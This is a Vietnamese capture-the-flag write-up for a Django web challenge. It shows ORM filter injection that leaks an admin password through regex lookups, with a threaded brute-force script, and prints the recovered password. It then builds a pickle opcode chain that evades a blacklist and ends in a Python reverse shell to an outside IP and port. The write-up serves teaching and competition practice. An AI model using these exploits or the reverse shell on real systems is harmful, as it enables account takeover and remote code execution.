Đây là một bài phức tạp lợi dụng lỗ hổng ORM injection và khai thác với OPCODE pickle bypass blacklist phức tạp.
Source code cho ta thấy được đây là một ứng dụng Django dạng web cơ bản
 có tác dụng register/login và unpickle dữ liệu người dùng. Tại `Dockerfile` ta thấy được service sử dụng sqlite3, docker tạo một file flag-random.txt và cấu hình mật khẩu ngẫu nhiên 128 kí tự cho admin.

Challenge cũng cung cấp cho ta `db.sqlite3`, ta sẽ kiểm tra database xem cấu trúc nó ra sao

<img width="1034" height="304" alt="image" src="https://github.com/user-attachments/assets/178f779a-77c9-41b4-a8e5-7fa1a2c521ce" />  

Vậy là ở đây ta có bảng auth_user với các trường 
is_superuser, is_staff. Đặc biệt là có vẻ như password không được lưu 
dưới dạng hash mà là plaintext. Đến đây mình đã thử login với mật khẩu `nani` nhưng tất nhiên là không đúng do docker đã thực hiện đặt lại mật khẩu trong quá trình build.

Tiếp theo ta quan tâm tới logic của trang web nằm trong `app/views.py` và `app/sandbox.py`

Tại đây ta được cung cấp 5 entry points bao gồm HomePage, SignupPage, 
LoginPage, LogoutPage và AdminPage. Đầu tiên ta phân tích cách một user
 có thể đăng ký tài khoản ra sao: người dùng nhập thông tin vào 4 field 
username, email, password và confirm_pasword. Nếu thông tin hợp lệ thì 
thực hiện đăng ký người dùng mới như sau:

```python
user = User.objects.create(**user_data)
user.save()
```

Nói một cách dễ hiểu, `create()` cung cấp dev 
một cách nhanh gọn để thực hiện insert giá trị. Tuy nhiên đây không phải
 là cách chính xác để tạo một user mới do không hỗ trợ hash chuỗi mật 
khẩu.

[Difference between User.objects.create_user() vs User.objects.create() vs User().save() in django - Stack Overflow](https://stackoverflow.com/questions/63054997/difference-between-user-objects-create-user-vs-user-objects-create-vs-user)

Tại bài viết Stack Overflow này đã cho ta thấy một ví dụ sử dụng `create_user()`, mật khẩu ở đây đã được tự động hash sử dụng PBKDF2 và SHA-256, tuy nhiên `create()` lưu trữ dữ liệu ở dạng plain text. Điều này hợp lý với việc ta thấy 
password không được hash khi kiểm tra db.sqlite3 ở trên. Để rõ hơn về 
vấn đề này, mình đã thử debug xem create hoạt động ra sao [tại đây](https://github.com/nglong05/bl/blob/main/_B%C3%A1o%20c%C3%A1o%20task9.md#_chain_create), ta dễ thấy django đơn giản chỉ thực hiện câu lệnh INSERT.

Như vậy là ta đã lý giải được tại sao mật khẩu lại là 
plaintext và cách user đăng ký, tiếp tục phân tích các hoạt động khác 
của user: ta nhận thấy rằng khi user thực hiện login hoặc thực hiện hành
 động search trong homepage đều sử dụng:

`user = User.objects.filter(**user_data).first()`

 [Advice to get single object using get() or filter().first()](https://www.reddit.com/r/django/comments/6plqbn/advice_to_get_single_object_using_get_or/)

Tại bài viết này, tác giả đã đề cập tới việc so sánh hai phương thức `.get()` và `.filter().first()`.
 Nói một cách nhanh gọn, .get() chỉ lấy duy nhất 1 đối tượng thỏa mãn 
điều kiện đầu vào trong khi kết hợp .filter().first() sẽ lấy ra đối 
tượng đầu tiên trong các đối tượng được query (tương tự LIMIT 1). Trong 
trường hợp của chúng ta, service đang sử dụng cách thứ hai đồng thời 
nhận trực tiếp userinput qua **kwags cho nên tồn tại lỗ hổng ORM leak 
qua các field lookup.

[Django QuerySet - Filter](https://www.w3schools.com/django/django_queryset_filter.php)

Tại bài viết này của w3school đã giới thiệu về Field lookup, nó hỗ trợ việc tạo ra các WHERE clause một cách cụ thể, một ví dụ:

<img width="1325" height="391" alt="image" src="https://github.com/user-attachments/assets/d85bb2b7-96c7-490f-9778-68827d6ed349" />  

Quay lại phần code của enpoint HomePage, ở đây sử dụng:

```python
user_data = parse_qs(request.body.decode('utf-8'))
user_data.pop('csrfmiddlewaretoken', None)
user_data = {k: v[0] for k, v in user_data.items()}
try:    users = []    user = User.objects.filter(**user_data).first()
```

Tại đây, ta có thể thêm tùy chỉnh các keywork argument (**kwags) vào trong filter() do `user_data` parse toàn bộ data trong request. Điều đó đồng nghĩa với việc ta có thể thêm các field lookup một cách tùy chỉnh để khai thác.

Ví dụ đơn giản như sau: nếu post data chứa `username=admin` thì backed sẽ thực hiện `User.objects.filter(username="admin").first()` thực hiện trả về kết quả đầu tiên của query. Nhưng nếu ta truyền `username=admin&password__regex=^u` thì `filter(username="admin", password__regex="u").first()` sẽ được thực thi và đồng thời áp dụng thêm điều kiện regex, nếu kết quả
 vẫn trả về thì đồng nghĩa với việc password của admin thỏa mãn regex 
^u.

[PayloadsAllTheThings/ORM Leak/README.md at master · swisskyrepo/PayloadsAllTheThings · GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/ORM%20Leak/README.md)

Ở tài liệu trên đã cung cấp một số cách để khai thác bao 
gồm việc sử dụng __startswith, __contains và __regex cho trường hợp của 
chúng ta. Logic để khai thác tương tự nhau: brute-force từng kí tự rồi 
quan sát kết quả trả về từ đó trích xuất dữ liệu. Ví dụ như ta có thể 
thử `password__startswith = 'abc'`, nếu kết quả trả về là tài khoản admin thì ta biết mật khẩu bắt đầu với 'abc', lặp lại quá trình để trích xuất hết mật khẩu.

Ta đang làm việc với Sqlite3 nơi LIKE clause không hỗ trợ case-sensitive. Vậy nên ta sẽ sử dụng field lookup `__regex` để trích xuất data.

<img width="893" height="240" alt="image" src="https://github.com/user-attachments/assets/a7c333e8-9b2f-4783-a2f1-93c30c80258a" />  

```python
import requests
import string
from concurrent.futures import ThreadPoolExecutor, as_completed

url = "http://103.197.184.163:8002/home/"
cookies = {
    'csrftoken': 'a1mcE6bavm8TNwMBxPSZDvf2o5xqlvhP',
    'sessionid': '0dxj9jvfz2ajqwf7e66tm4yad6xr5fwy'
}
headers = {
    'Content-Type': 'application/x-www-form-urlencoded'
}

charset = string.ascii_lowercase + string.ascii_uppercase + string.digits
found = "^u"

def send_req(c, prefix):
    current = prefix + c
    data = {
        'csrfmiddlewaretoken': cookies['csrftoken'],
        'password__regex': current
    }
    r = requests.post(url, headers=headers, cookies=cookies, data=data)
    if "admin" in r.text:
        return c
    return None

while True:
    found_char = False
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(send_req, c, found): c for c in charset}
        for future in as_completed(futures):
            result = future.result()
            if result is not None:
                found += result
                print(found[1:])
                found_char = True
                break

    if not found_char:
        break
```

ta nhận được mật khẩu của admin và thành công login. `Kpvwmec6swPh6WFFo6BFnf0HKgmr5otfEZj9sSxKNNs9PhsRhCEAOGqVL6VyAiI32EppTmsIeT8kY7aelEvtGkQXsF2t0UKcZmOGvDbPkm6acsKUALXb6zJWmqpRbm8A`

Khi đăng nhập với tài khoản admin ta có thể truy cập page AdminPage và thực hiện hàm unpickle trong `sandbox.py`

```python
payload = (
b'''\x80\x04c__main__
__builtins__.eval
(V__import__('os').system('whoami')
tp0
Rp1
.'''
)
```

Ta sử dụng chain `__main__.__builtins__.eval("__import__('os').system('whoami')")`.
 Như vậy ta thành công vượt qua lớp kiểm tra whitelist ở module. Một 
điểm lưu ý là, ở đây ta cần chỉ rõ protocol được sử dụng là 4 trở lên.

Tiếp theo ta cần phải thực hiện thêm việc bypass logic được thêm: các module
 không được bắt đầu bằng các giá trị trong UNSAFE_NAMES và 
BLACKLISTED_NAMES. Để bypass được ta cần thực hiện một chain phức tạp 
hơn. Một điều khó khăn trong việc craft chain là pickle không hỗ trợ 
việc truy cập trực tiếp value-key như python thông thường mà ta sẽ phải 
tư duy với logic stack để dần truy cập đến attribute mong muốn.

Tuy nhiên, ta không thể trực tiếp craft payload này nhờ opcode vì pickle không hỗ trợ truy cập key-value, ta không thể gọi `__subclasses__()[137]` hay `__globals__['__builtins__']['eval']` trực tiếp. Để giải quyết vấn đề này, ta phải tìm cách truy cập các attribute này nhờ các method callable có sẵn ví dụ `__getattribute__`, `list.__getitem__`, `object.__subclasses__`. Đầu tiên ta cần truy cập tới value index của list `__subclasses__()`

```python
import __main__
def main():pass

mysubclasses = __main__.__class__.__base__.__subclasses__
myatrr = __main__.__class__.__base__.__getattribute__
mysubclasseslist = mysubclasses()                      #[1]
mygetitem = myatrr(mysubclasseslist, '__getitem__')    #[2]
myoswrapclose = mygetitem(155)                         #[3]

print(myoswrapclose) #<class 'os._wrap_close'>
```

Phần code này định nghĩa 2 method và thực thi 3 method chỉ sử dụng những yếu tố pickle có: thực thi với **REDUCE** và đệ quy lấy attribute với proto 4 trở lên. Phân tích như sau:

1. Khi ta thực thi method `object.__subclasses__()` như 
   trình bày trong phần code trên là phần định nghĩa biến mysubclasseslist,
   nó sẽ trả về một list là những class là subclass của object.

2. Khi ta thực thi method `object.__getattribute__(obj, "attr-name")` thì nó sẽ thực hiện trả về thuộc tính attr-name của object obj, hay 
   mình thường hiểu là nó trả về obj.attr-name. Như trong code trên thì nó 
   trả về `object.__subclasses__()__getitem__` . Vốn dĩ là vì lúc này obj là một list, mà list thì sẽ có cái dunder method `__getitem__`.

3. Khi ta thực thi method `list.__getitem__(key)` thì nó đơn giản là trả về list[key]. Ở phần code thì nó trả về `object.__subclasses__()__getitem__(155)` rồi !

Như vậy là ta đã có thể truy cập đến class os._wrap_close chỉ với việc thực thi các method khác nhau một cách vi diệu.

```python
myinit = myatrr(myoswrapclose, '__init__')               #[1]
myglobals = myatrr(myinit, '__globals__')
mybuiltinsdict = myatrr(myglobals, '__getitem__')        #[2]
mybuiltins = mybuiltinsdict('__builtins__')
myevaldict = myatrr(mybuiltins, '__getitem__')           #[3]
myeval = myevaldict('eval')
mycommand = myeval('__import__("os").system("whoami")')

print(mycommand) #nguyenlong05
```

Phân tích phần tiếp theo để đi đến eval:

1. Ta tiếp tục chain bằng method `object.__getattribute__` định nghĩa ở trên, lần lượt đi tới `object.__subclasses__()[137].__init__.__globals__`

2. Lưu ý rằng, lúc này `__globals__` chứa các dict cho nên khi ta trích xuất builtins lại một lần nữa sử dụng `__getitem__`. Ở đây getitem trả về value trong dict cho nên ta truyền giá trị là key vào method getattribute. Cuối cùng ta nhận được `__globals__['__builtins__']`

3. Lặp lại một lần nữa ta nhận được `__globals__['__builtins__']['eval']`,
   chính là method eval. Cuối cùng thực thi hàm này với tham số là command
   cần được thực thi, xác nhận khả năng bypass của payload.

Thực hiện viết lại payload dưới dạng bytecodes của pickles như sau:

```
raw = (
    b"\x80\x04"
    # mysubclasses
    b"c__main__\n__class__.__base__.__subclasses__\n"
    b"(" b"t" b"R"                # () → __subclasses__() -> list
    b"p0\n"                       # memo[0] = subclasseslist
    # myattr
    b"c__main__\n__class__.__base__.__getattribute__\n"
    b"p1\n"                       # memo[1] = object.__getattribute__
    # mygetitem
    b"(" b"g0\n" b"V__getitem__\n" b"t" b"R"
    # myoswrapclose = mygetitem(155)
    b"(" b"I155\n" b"t" b"R"
    b"p2\n"                       # memo[2] = myoswrapclose
    # myinit
    b"g1\n"                       # push __getattribute__
    b"(" b"g2\n" b"V__init__\n" b"t" b"R"
    b"p3\n"                       # memo[3] = myinit
    # myglobals
    b"g1\n" b"(" b"g3\n" b"V__globals__\n" b"t" b"R"
    b"p4\n"                       # memo[4] = myglobals (dict)
    # mybuiltinsdict
    b"g1\n" b"(" b"g4\n" b"V__getitem__\n" b"t" b"R"
    b"p5\n"                       # memo[5] = mybuiltinsdict (bound)
    # mybuiltins
    b"(" b"V__builtins__\n" b"t" b"R"
    b"p6\n"                       # memo[6] = __builtins__ (dict/module)
    # myevaldict
    b"g1\n" b"(" b"g6\n" b"V__getitem__\n" b"t" b"R"
    b"p7\n"                       # memo[7] = myevaldict
    # myeval
    b"(" b"Veval\n" b"t" b"R"
    b"p8\n"                       # memo[8] = eval
    # mycommand
    b"(" b"V__import__(\"os\").system(\"whoami\")\n" b"t" b"R"
    b"."
)
```

Tiếp theo ta cần bypass unicode để bypass lượt 
kiểm tra đầu tiên của service. Những giá trị encode này được
 decode trong quá trình unpickle, còn lượt kiểm tra ban đầu chỉ đơn giản
 là kiểm tra chuỗi bytecodes xem có chứa các giá trị trong blacklist 
không mà thôi. Ví dụ, hàm kiểm tra đầu sẽ nhìn `V__globals_\u005f` là chuỗi `__globals_\u005f` trong khi pickle sẽ nhìn thấy `__globals__`.

```
    b"c__main__\n__class__.__base__.__subclasses__\n"
    b"(" b"t" b"R"
    b"p0\n"
```

Hiện tại, ta đang thực hiện thực thi method ban đầu bằng cách sử dụng opcode c **GLOBAL**. opcode này load module theo tên được truyền vào và không thể dùng trick bypass của opcode **V** được. Vậy ta phải tìm một cách khác để load module mà vẫn dùng opcode V để encode những chuỗi sẽ bị cấm.

```
    b"V__main__\n"
    b"V__class__.__base_\u005f.__subclasses__\n"
    b"\x93"
    b"(" b"t" b"R"
    b"p0\n"
```

Ở protocol 4 mặc định sử dụng opcode **STACK_GLOBAL** thay vì là **GLOBAL** và nó linh hoạt hơn rất nhiều khi có thể load từ stack. Như vậy ta chỉ 
việc push hai chuỗi module và attribute lên stack với opcode **V** rồi dùng **\x93** để lấy object là xong. Như ví dụ trên thì thay vì trực tiếp truyền các giá trị vào GLOBAL thì ta push `__main__` và `__class__.__base__.__subclasses__` lên stack, sau đó thực hiện đặt **MARK**, gói **TUPLE** và **REDUCE** như thường để thực hiện gọi method subclasses(). làm tương tự để bypass và ta có kết quả:

<img width="943" height="437" alt="image" src="https://github.com/user-attachments/assets/393ee46f-fcab-481b-84ca-976394ae4529" />  

Ta đã thành công gọi method eval của python nên có thể trực tiếp sử dụng các payload revshell của python:

```python
export RHOST="13.213.213.17";
export RPORT=10774;
python -c '
import sys,socket,os,pty;
s=socket.socket();
s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));
[os.dup2(s.fileno(),fd) for fd in (0,1,2)];
pty.spawn("sh")
'
```

Ta có thể thực gói đống này lại vào trong `__import__('os').system('....')` để hoàn thiện thực thi revshell. Payload cuối cùng với unicode kí tự `_` và `s`, ở đây ta có thể nhảy vào trong docker hoặc brute force xem os.*wrap_close* nằm ở index nào, trong trường hợp này là 134:

```python
import base64
raw = (
    b"\x80\x04"
    b"V__main__\n"
    b"V__class__.__base_\u005f.__subclasses__\n"
    b"\x93"
    b"(" b"t" b"R"
    b"p0\n"
    b"V__main__\n"
    b"V__class__.__base_\u005f.__getattribute__\n"
    b"\x93"
    b"p1\n"
    b"(" b"g0\n" b"V__getitem__\n" b"t" b"R"
    b"(" b"I134\n" b"t" b"R"
    b"p2\n"
    b"g1\n"
    b"(" b"g2\n" b"V__init__\n" b"t" b"R"
    b"p3\n"
    b"g1\n" b"(" b"g3\n" b"V__globals_\u005f\n" b"t" b"R"
    b"p4\n"
    b"g1\n" b"(" b"g4\n" b"V__getitem__\n" b"t" b"R"
    b"p5\n"
    b"(" b"V__builtins_\u005f\n" b"t" b"R"
    b"p6\n"
    b"g1\n" b"(" b"g6\n" b"V__getitem_\u005f\n" b"t" b"R"
    b"p7\n"
    b"(" b"Veval\n" b"t" b"R"
    b"p8\n"
    b"(V__import_\u005f('o\u0073').sy\u0073tem(\"export RHOST='13.213.213.17';export RPORT=10774;python -c \\\"import sy\u0073,socket,o\u0073,pty;s=socket.socket();s.connect((o\u0073.getenv('RHOST'),int(o\u0073.getenv('RPORT'))));[o\u0073.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn('bash')\\\"\")\n"
    b"t"
    b"R"
    b"."
)
print(base64.b64encode(raw))
```

<img width="1286" height="670" alt="image" src="https://github.com/user-attachments/assets/9493bc3f-4c6f-4a65-a9d4-6acce7c32b64" />  

FROM THE [SOURCE](https://github.com/nglong05/CTF-write-ups/blob/main/Web/PTITCTF/WriteUpPTITCTF_vongloai.md)
